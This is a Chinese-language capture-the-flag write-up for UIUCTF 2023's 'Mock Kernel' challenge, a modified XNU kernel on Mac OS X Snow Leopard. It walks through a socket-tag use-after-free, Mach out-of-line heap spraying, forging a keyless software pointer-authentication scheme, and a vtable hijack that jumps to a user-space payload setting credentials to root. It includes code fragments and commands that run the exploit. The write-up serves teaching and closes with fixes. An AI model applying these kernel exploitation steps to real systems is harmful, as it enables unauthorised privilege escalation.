# UIUCTF 2023 Mock Kernel Writeup

## 题目简述

远端是 Mac OS X Snow Leopard 10.6，运行被修改的 XNU 1456.1.26 内核。题目同时给出原版和修改版 `mach_kernel`；差分可发现两个新增组件：

- `sotag`：通过 `SO_SOTAG_MODE` 给 socket 附加 0x40 字节标签和一个 vtable；
- `softpac`：用软件实现 16 位 Pointer Authentication Code，保护 vtable 指针和其中的函数指针。

目标是从普通用户获得内核代码执行并把当前进程凭据改为 root。

## 解题过程

### 1. 确认 UAF 与保护对象

核心对象布局为：

```c
struct sotag {
    char tag[0x40];
    struct sotag_vtable *vtable;
};

struct sotag_vtable {
    void (*dispatch)(char *, char *);
};
```

`CTF_CREATE_TAG` 分配对象，`CTF_EDIT_TAG` 修改 `tag`，`CTF_SHOW_TAG` 通过 `vtable->dispatch` 返回内容。`CTF_REMOVE_TAG` 只执行：

```c
kfree(so->attached_sotag, sizeof(struct sotag));
```

却没有把 `so->attached_sotag` 清零，形成稳定的 use-after-free。只要 socket 仍存在，后续 `setsockopt`、`getsockopt` 仍会把复用后的内存当作 `sotag` 操作。

### 2. 用 Mach OOL 消息复用对象并泄露堆地址

Mach out-of-line 消息会在通用 `kalloc` 上创建 `vm_map_copy`，其尾部数据长度可控。通过大量发送匹配大小的 OOL 消息，可以让 `vm_map_copy` 占据已释放的 `sotag`。

第一次喷射只使用 1 字节 OOL 数据 `0x00`。`vm_map_copy` 的数据恰从旧对象偏移 `+0x40` 开始，覆盖 `vtable` 的最低字节；而真实 vtable 由 `kalloc(0x100)` 分配，本就 0x100 对齐，最低字节是 0，所以受保护指针保持不变，`CTF_SHOW_TAG` 仍能通过认证。

此时旧 `tag` 区域实际是 `vm_map_copy`。读取偏移 `+24` 的 `kdata` 字段可泄露 OOL 尾部地址，它正好等于旧对象中 `&sotag->vtable` 的地址。这个堆地址是伪造 SoftPAC 所必需的盐值。

### 3. 在用户态复现并伪造 SoftPAC

SoftPAC 没有秘密硬件密钥。它对 `flavor`、指针存储地址和未签名指针做 MD5，再把 16 字节摘要按 16 位分组全部异或，得到 16 位 PAC：

```c
pac_t compute_pac(flavor_t flavor, uint64_t storage, uint64_t pointer)
{
    unsigned char digest[16];
    MD5_CTX ctx;
    uint16_t pac = 0;

    MD5_Init(&ctx);
    MD5_Update(&ctx, &flavor, sizeof(flavor));
    MD5_Update(&ctx, &storage, sizeof(storage));
    MD5_Update(&ctx, &pointer, sizeof(pointer));
    MD5_Final(digest, &ctx);

    for (int i = 0; i < 8; i++)
        pac ^= digest[2 * i] | (digest[2 * i + 1] << 8);
    return pac;
}
```

PAC 被放入指针的第 47 至 62 位。利用泄露的 `vtable` 字段地址，可在 `sotag.tag` 内构造两级伪造链：

1. 把假 vtable 放在 `vtable_address - 56`，即 `tag` 内偏移 8；
2. 以 `SOFTPAC_INST` 和假 vtable 地址为盐，签名指向用户态 `target_fn` 的 `dispatch`；
3. 以 `SOFTPAC_DATA` 和真实 `&sotag->vtable` 为盐，签名指向假 vtable 的数据指针。

### 4. 第二次喷射并 ret2usr

先接收并释放第一轮 OOL 消息，再进行第二轮喷射。这次每个 OOL 描述符携带完整 8 字节的已签名假 vtable 指针，从而覆盖悬空对象的 `vtable` 字段。

Snow Leopard 环境没有 kASLR、SMEP、SMAP，也没有现代堆随机化，因此通过 `getsockopt` 再次触发 `CTF_SHOW_TAG` 后，内核会认证伪造的两级指针，并直接跳到用户态 `target_fn` 以内核权限执行。载荷利用固定内核符号获取当前凭据：

```c
#define CURRENT_PROC 0xffffff800025350cULL
#define PROC_UCRED    0xffffff8000249967ULL

void target_fn(void)
{
    void *proc = ((void *(*)())CURRENT_PROC)();
    struct ucred *cred =
        ((struct ucred *(*)(void *))PROC_UCRED)(proc);

    cred->cr_uid = cred->cr_ruid = cred->cr_svuid = 0;
    cred->cr_rgid = cred->cr_svgid = cred->cr_gmuid = 0;
}
```

完整官方 exploit 包含 Mach port 建立、两轮 1200 次 OOL 喷射和 SoftPAC 指针封装，可从 [作者的 Mock Kernel 解题仓库](https://github.com/jprx/mock-kernel-2023) 取得；关键原语与调用顺序已在上文列全。在题目 Snow Leopard VM 内编译并执行：

```bash
g++ exploit.c -o exploit -lcrypto
./exploit
id
cat /flag
```

最终得到：

```text
uiuctf{sn0w_le0p4rd_1s_th3_b3st_XNU_ever_m4de}
```

## 方法总结

完整利用链是 `sotag UAF → Mach OOL 堆复用 → vm_map_copy 地址泄露 → 用户态伪造两级 SoftPAC → vtable 劫持 → ret2usr 提权`。SoftPAC 强制攻击者先获得对象地址，但其签名算法没有秘密密钥，所以地址泄露后即可完全伪造。更根本的修复是释放后清空 socket 中的指针、阻止 UAF；现代 SMEP/SMAP、kASLR 和隔离堆还能显著抬高从对象破坏到代码执行的成本。
